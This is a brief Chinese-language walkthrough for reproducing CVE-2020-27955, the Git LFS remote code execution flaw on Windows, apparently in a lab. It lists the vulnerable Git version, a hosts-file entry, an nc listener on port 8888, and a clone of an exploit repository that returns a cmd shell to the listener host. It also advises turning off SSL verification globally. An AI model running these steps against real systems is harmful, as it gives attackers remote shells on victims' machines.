# CVE-2020-27955漏洞复现

1、win机下载有漏洞的版本Git-LFS

下载地址：https://github.com/git-for-windows/git/releases/tag/v2.29.2.windows.1

2、win机安装，添加如下信息host文件,10.1.1.5即是nc监听8888的主机（可自行替换）

10.1.1.5  abcall.xyz

3、10.1.1.5主机，nc启监听口8888

┌──(root㉿hostname)-[~]

└─# nc

Cmd line: -l -p 8888

4、win机cmd命令行输入

git clone https://github.com/z50913/CVE-2020-27955.git

5、10.1.1.5获得win机cmd的shell

#其他
如报ssl证书问题可先输入以下命令，屏蔽ssl验证，再重新clone

git config --global http.sslverify false
